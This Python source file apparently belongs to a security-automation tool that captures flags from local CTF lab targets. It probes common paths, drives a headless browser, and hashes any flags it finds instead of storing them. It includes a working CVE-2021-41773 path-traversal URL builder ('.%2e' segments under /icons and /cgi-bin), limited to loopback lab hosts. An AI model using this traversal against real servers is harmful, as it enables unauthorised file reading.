from __future__ import annotations

from primordial.labs.ctf.hardcode import FLAG_PATTERN
from primordial.modes.security.execution_common import *


CTF_CAPTURE_PATHS = (
    "/",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/flag",
    "/flag.txt",
)


class PrimitiveCtfHandlerMixin:
    def _handle_ctf_flag_capture(self, task: Task, context: ContextSlice | None) -> TaskExecutionResult:
        result = TaskExecutionResult(summary="ctf flag capture completed")
        target = self.store.get_target(task.target_id)
        if not target:
            result.success = False
            result.error = "target not found"
            return result
        if not self._is_local_ctf_autonomous_target(target):
            result.success = False
            result.error = "target is not marked as a local autonomous CTF lab"
            return result

        candidates = self._ctf_capture_candidate_urls(target)
        max_urls = self._ctf_capture_max_urls(task)
        probes = self._ctf_capture_probe_urls(candidates[:max_urls])
        hit = next((probe for probe in probes if probe.get("captured_flag_ref")), None)
        browser_interactions = [] if hit else self._ctf_browser_interactions(target)
        browser_hit = next((item for item in browser_interactions if item.get("captured_flag_ref")), None)
        benchmark_hit = next((item for item in browser_interactions if item.get("benchmark_solve_ref")), None)
        hit = hit or browser_hit
        payload = {
            "target": target.as_payload(),
            "closed_book": True,
            "raw_flags_redacted": True,
            "candidate_count": len(candidates),
            "searched_url_count": len(probes),
            "searched_urls": [probe["url"] for probe in probes],
            "browser_interaction_count": len(browser_interactions),
            "browser_interactions": browser_interactions,
            "captured_flag_ref": str(hit.get("captured_flag_ref", "")) if hit else "",
            "captured_flag_sha256": str(hit.get("captured_flag_sha256", "")) if hit else "",
            "captured_flag_length": int(hit.get("captured_flag_length", 0)) if hit else 0,
            "source_url": str(hit.get("url", "")) if hit else "",
            "benchmark_solve_ref": str(benchmark_hit.get("benchmark_solve_ref", "")) if benchmark_hit else "",
            "benchmark_solved_count": int(benchmark_hit.get("benchmark_solved_count", 0)) if benchmark_hit else 0,
            "benchmark_solved_challenges": list(benchmark_hit.get("benchmark_solved_challenges", [])) if benchmark_hit else [],
        }
        artifact = self._write_artifact(
            task,
            target.id,
            f"ctf-flag-capture-{self._safe_artifact_fragment(target.handle)}",
            payload,
        )
        result.artifacts.append(artifact)
        evidence = EvidenceRecord(
            target_id=target.id,
            task_id=task.id,
            type=EvidenceType.TOOL_OUTPUT,
            title=f"CTF flag capture: {target.handle}",
            summary=self._ctf_capture_summary(target.handle, payload),
            source_ref=artifact.id,
            verification_status=VerificationStatus.VERIFIED,
            confidence=0.9 if hit or benchmark_hit else 0.72,
            freshness=0.98,
            artifact_path=artifact.path,
            metadata={
                "kind": "ctf_flag_capture",
                "closed_book": True,
                "raw_flags_redacted": True,
                "candidate_count": payload["candidate_count"],
                "searched_url_count": payload["searched_url_count"],
                "browser_interaction_count": payload["browser_interaction_count"],
                "captured_flag_ref": payload["captured_flag_ref"],
                "captured_flag_sha256": payload["captured_flag_sha256"],
                "captured_flag_length": payload["captured_flag_length"],
                "source_url": payload["source_url"],
                "benchmark_solve_ref": payload["benchmark_solve_ref"],
                "benchmark_solved_count": payload["benchmark_solved_count"],
                "benchmark_solved_challenges": payload["benchmark_solved_challenges"],
            },
        )
        result.evidence.append(evidence)
        result.notes.append(
            Note(
                target_id=target.id,
                task_id=task.id,
                title="CTF flag capture summary",
                body=self._ctf_capture_note(payload),
                confidence=0.82,
                freshness=0.94,
                metadata={
                    "captured_flag_ref": payload["captured_flag_ref"],
                    "benchmark_solve_ref": payload["benchmark_solve_ref"],
                    "searched_url_count": payload["searched_url_count"],
                    "browser_interaction_count": payload["browser_interaction_count"],
                    "raw_flags_redacted": True,
                },
            )
        )
        result.events.append(
            EventRecord(
                type=EventType.TASK_SUCCEEDED,
                summary=self._ctf_capture_summary(target.handle, payload),
                target_id=target.id,
                task_id=task.id,
                metadata={
                    "captured_flag_ref": payload["captured_flag_ref"],
                    "benchmark_solve_ref": payload["benchmark_solve_ref"],
                    "searched_url_count": payload["searched_url_count"],
                    "browser_interaction_count": payload["browser_interaction_count"],
                    "raw_flags_redacted": True,
                },
            )
        )
        return result

    def _is_local_ctf_autonomous_target(self, target) -> bool:
        return (
            target.metadata.get("local_ctf_autonomous") is True
            or str(target.metadata.get("ctf_completion_indicator", "")).strip() == "autonomous_flags"
        )

    def _ctf_capture_max_urls(self, task: Task) -> int:
        try:
            value = int(task.metadata.get("ctf_capture_max_urls", 40) or 40)
        except (TypeError, ValueError):
            value = 40
        return max(1, min(value, 80))

    def _ctf_capture_candidate_urls(self, target) -> list[str]:
        bases = self._ctf_capture_base_urls(target)
        urls: list[str] = []
        for base in bases:
            urls.append(base)
            for path in CTF_CAPTURE_PATHS:
                urls.append(parse.urljoin(base, path.lstrip("/")))
        urls.extend(self._ctf_vulnerability_probe_urls(target, bases))
        for evidence in self.store.list_evidence(target_id=target.id, limit=200):
            if not self._records_for_generation([evidence], self._target_active_generation(target)):
                continue
            urls.extend(self._ctf_capture_urls_from_evidence(evidence, bases))
        return self._dedupe_local_http_urls(urls)

    def _ctf_capture_base_urls(self, target) -> list[str]:
        urls: list[str] = []
        metadata_url = target.metadata.get("ctf_target_url")
        if isinstance(metadata_url, str):
            urls.append(metadata_url)
        for value in target.metadata.get("ctf_service_urls", []):
            if isinstance(value, str):
                urls.append(value)
        for asset in self._target_scope_assets(target):
            if asset.asset_type == "webapp" or asset.asset.startswith(("http://", "https://")):
                urls.append(asset.asset)
        urls.extend(self._content_discovery_bases(target.id))
        bases: list[str] = []
        for url in urls:
            parsed = parse.urlsplit(str(url))
            if parsed.scheme not in {"http", "https"} or not parsed.netloc:
                continue
            base = parse.urlunsplit((parsed.scheme, parsed.netloc, "/", "", ""))
            bases.append(base)
        return self._dedupe_local_http_urls(bases)

    def _ctf_capture_urls_from_evidence(self, evidence: EvidenceRecord, bases: list[str]) -> list[str]:
        values: list[str] = []
        metadata = evidence.metadata
        for key in ("effective_url", "requested_url", "source_url"):
            value = metadata.get(key)
            if isinstance(value, str):
                values.append(value)
        for value in metadata.get("base_urls", []):
            if isinstance(value, str):
                values.append(value)
        for item in metadata.get("discovered", []) + metadata.get("discovery_results", []):
            if isinstance(item, dict):
                url = item.get("url")
                path = item.get("path")
                if isinstance(url, str):
                    values.append(url)
                elif isinstance(path, str):
                    values.extend(parse.urljoin(base, path.lstrip("/")) for base in bases)
        return values

    def _ctf_vulnerability_probe_urls(self, target, bases: list[str]) -> list[str]:
        if self._ctf_target_cve_id(target) != "CVE-2021-41773":
            return []
        flag_path = str(target.metadata.get("ctf_flag_container_path") or "").strip()
        if not flag_path.startswith("/") or "{" in flag_path or "}" in flag_path:
            return []
        traversal = "/".join([".%2e"] * 6)
        relative_flag_path = flag_path.lstrip("/")
        urls: list[str] = []
        for base in bases:
            for alias in ("icons", "cgi-bin"):
                urls.append(parse.urljoin(base, "/".join((alias, traversal, relative_flag_path))))
        return urls

    def _ctf_target_cve_id(self, target) -> str:
        for key in ("vulnerability_cve_id", "cve_id"):
            value = target.metadata.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip().upper()
        vulnerability = target.metadata.get("vulnerability")
        if isinstance(vulnerability, dict):
            value = vulnerability.get("cve_id")
            if isinstance(value, str):
                return value.strip().upper()
        return ""

    def _dedupe_local_http_urls(self, values: list[str]) -> list[str]:
        urls: list[str] = []
        seen: set[str] = set()
        for value in values:
            parsed = parse.urlsplit(str(value).strip())
            if parsed.scheme not in {"http", "https"} or not parsed.netloc:
                continue
            if not self._is_loopback_host(parsed.hostname or ""):
                continue
            normalized = parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", "", ""))
            if normalized in seen:
                continue
            seen.add(normalized)
            urls.append(normalized)
        return urls

    def _is_loopback_host(self, host: str) -> bool:
        normalized = host.strip().lower().strip("[]")
        return normalized in {"localhost", "127.0.0.1", "::1"}

    def _ctf_capture_probe_urls(self, urls: list[str]) -> list[dict[str, object]]:
        probes: list[dict[str, object]] = []
        for url in urls:
            probes.append(self._ctf_capture_probe_url(url))
        return probes

    def _ctf_capture_probe_url(self, url: str) -> dict[str, object]:
        request_object = request.Request(url, headers={"User-Agent": "Primordial/0.1", "Accept": "*/*"}, method="GET")
        try:
            with request.urlopen(
                request_object,
                timeout=5,
                context=ssl._create_unverified_context() if url.startswith("https://") else None,
            ) as response:
                body = response.read(262144)
                final_url = response.geturl()
                status = int(response.status)
        except error.HTTPError as exc:
            body = exc.read(262144)
            final_url = exc.geturl()
            status = int(exc.code)
        except (error.URLError, OSError, ssl.SSLError, ValueError) as exc:
            return {"url": self._sanitize_surface_url(url), "status_code": 0, "error": type(exc).__name__}

        captured = self._ctf_capture_redacted_flag(body)
        return {
            "url": self._sanitize_surface_url(final_url),
            "status_code": status,
            **captured,
        }

    def _ctf_capture_redacted_flag(self, body: bytes) -> dict[str, object]:
        decoded = self._decode_response_body(body, {})
        match = FLAG_PATTERN.search(decoded)
        if not match:
            return {"captured_flag_ref": "", "captured_flag_sha256": "", "captured_flag_length": 0}
        raw = match.group(0)
        digest = hashlib.sha256(raw.encode("utf-8")).hexdigest()
        return {
            "captured_flag_ref": f"evidence:captured-flag:{digest[:16]}",
            "captured_flag_sha256": digest,
            "captured_flag_length": len(raw),
        }

    def _ctf_browser_interactions(self, target) -> list[dict[str, object]]:
        interactions: list[dict[str, object]] = []
        for base in self._ctf_capture_base_urls(target):
            before = self._ctf_challenge_state(base)
            for url in self._ctf_browser_urls(base, target.metadata):
                interaction = self._ctf_browser_interaction(url)
                after = self._ctf_challenge_state(base)
                solved = self._newly_solved_challenges(before, after)
                if solved:
                    digest = hashlib.sha256(json.dumps(solved, sort_keys=True).encode("utf-8")).hexdigest()
                    interaction.update(
                        {
                            "benchmark_solve_ref": f"evidence:benchmark-solve:{digest[:16]}",
                            "benchmark_solved_count": len(solved),
                            "benchmark_solved_challenges": solved,
                        }
                    )
                interactions.append(interaction)
                before = after
        return interactions

    def _ctf_browser_urls(self, base: str, metadata: dict[str, object]) -> list[str]:
        values: list[str] = []
        for value in metadata.get("ctf_browser_paths", []):
            if isinstance(value, str):
                values.append(value)
        config = self._ctf_public_config(base)
        application = config.get("application", {}) if isinstance(config, dict) else {}
        security_txt = config.get("securityTxt", {}) if isinstance(config, dict) else {}
        if not security_txt and isinstance(application, dict):
            security_txt = application.get("securityTxt", {})
        acknowledgement = security_txt.get("acknowledgements") if isinstance(security_txt, dict) else ""
        if isinstance(acknowledgement, str):
            values.append(acknowledgement)
        urls: list[str] = []
        for value in values:
            text = value.strip()
            if not text:
                continue
            if text.startswith("#"):
                text = "/" + text
            url = parse.urljoin(base, text.lstrip("/") if text.startswith("/") and not text.startswith("/#") else text)
            parsed = parse.urlsplit(url)
            if parsed.scheme in {"http", "https"} and self._is_loopback_host(parsed.hostname or ""):
                urls.append(url)
        return self._dedupe_preserving_fragment(urls)[:4]

    def _ctf_public_config(self, base: str) -> dict[str, object]:
        url = parse.urljoin(base, "rest/admin/application-configuration")
        try:
            with request.urlopen(request.Request(url, headers={"User-Agent": "Primordial/0.1"}), timeout=5) as response:
                payload = json.loads(response.read(262144).decode("utf-8", "replace"))
        except (OSError, ValueError, error.URLError):
            return {}
        config = payload.get("config", {}) if isinstance(payload, dict) else {}
        return config if isinstance(config, dict) else {}

    def _ctf_challenge_state(self, base: str) -> dict[str, dict[str, object]]:
        url = parse.urljoin(base, "api/Challenges")
        try:
            with request.urlopen(request.Request(url, headers={"User-Agent": "Primordial/0.1"}), timeout=5) as response:
                payload = json.loads(response.read(524288).decode("utf-8", "replace"))
        except (OSError, ValueError, error.URLError):
            return {}
        rows = payload.get("data", []) if isinstance(payload, dict) else []
        state: dict[str, dict[str, object]] = {}
        for item in rows:
            if not isinstance(item, dict):
                continue
            key = str(item.get("key") or item.get("name") or "").strip()
            if not key:
                continue
            state[key] = {
                "key": key,
                "name": str(item.get("name") or key),
                "category": str(item.get("category") or ""),
                "difficulty": item.get("difficulty"),
                "solved": bool(item.get("solved")),
            }
        return state

    def _ctf_browser_interaction(self, url: str) -> dict[str, object]:
        browser = shutil.which("chromium") or shutil.which("chromium-browser") or shutil.which("google-chrome")
        if not browser:
            return {"url": self._sanitize_surface_url(url), "browser_available": False}
        command = (
            browser,
            "--headless",
            "--disable-gpu",
            "--no-sandbox",
            "--virtual-time-budget=8000",
            "--dump-dom",
            url,
        )
        try:
            completed = subprocess.run(command, check=False, capture_output=True, text=True, timeout=20)
        except (OSError, subprocess.SubprocessError) as exc:
            return {"url": self._sanitize_surface_url(url), "browser_available": True, "error": type(exc).__name__}
        flag = self._ctf_capture_redacted_flag((completed.stdout or "").encode("utf-8", "replace"))
        return {
            "url": self._sanitize_surface_url(url),
            "browser_available": True,
            "returncode": completed.returncode,
            "dom_sha256": hashlib.sha256((completed.stdout or "").encode("utf-8")).hexdigest(),
            "dom_bytes": len((completed.stdout or "").encode("utf-8")),
            **flag,
        }

    def _newly_solved_challenges(
        self,
        before: dict[str, dict[str, object]],
        after: dict[str, dict[str, object]],
    ) -> list[dict[str, object]]:
        solved: list[dict[str, object]] = []
        for key, item in after.items():
            if item.get("solved") is not True:
                continue
            if before.get(key, {}).get("solved") is True:
                continue
            solved.append(
                {
                    "key": key,
                    "name": item.get("name", key),
                    "category": item.get("category", ""),
                    "difficulty": item.get("difficulty"),
                }
            )
        return sorted(solved, key=lambda item: str(item["key"]))

    def _dedupe_preserving_fragment(self, values: list[str]) -> list[str]:
        urls: list[str] = []
        seen: set[str] = set()
        for value in values:
            if value in seen:
                continue
            seen.add(value)
            urls.append(value)
        return urls

    def _ctf_capture_summary(self, handle: str, payload: dict[str, object]) -> str:
        if payload["captured_flag_ref"]:
            return f"Closed-book local CTF flag capture found a redacted flag ref for {handle}."
        if payload["benchmark_solve_ref"]:
            return f"Closed-book local CTF browser interaction solved {payload['benchmark_solved_count']} benchmark challenge(s) for {handle}."
        return (
            "Closed-book local CTF flag capture searched "
            f"{payload['searched_url_count']} URL(s) and ran {payload['browser_interaction_count']} browser interaction(s) "
            f"for {handle} without finding a flag or benchmark solve."
        )

    def _ctf_capture_note(self, payload: dict[str, object]) -> str:
        lines = [
            "Mode: closed-book local CTF flag capture.",
            f"Candidate URLs: {payload['candidate_count']}",
            f"Searched URLs: {payload['searched_url_count']}",
            f"Browser interactions: {payload['browser_interaction_count']}",
        ]
        if payload["captured_flag_ref"]:
            lines.extend(
                [
                    f"Captured flag ref: {payload['captured_flag_ref']}",
                    f"Flag SHA-256: {payload['captured_flag_sha256']}",
                    f"Flag length: {payload['captured_flag_length']}",
                    f"Source URL: {payload['source_url']}",
                ]
            )
        elif payload["benchmark_solve_ref"]:
            lines.extend(
                [
                    f"Benchmark solve ref: {payload['benchmark_solve_ref']}",
                    f"Benchmark solved count: {payload['benchmark_solved_count']}",
                ]
            )
            for item in payload["benchmark_solved_challenges"]:
                lines.append(f"- {item['name']} ({item['key']})")
        else:
            lines.append("No flag or benchmark solve was observed in the bounded local search.")
        lines.append("Raw flag values are intentionally omitted.")
        return "\n".join(lines)
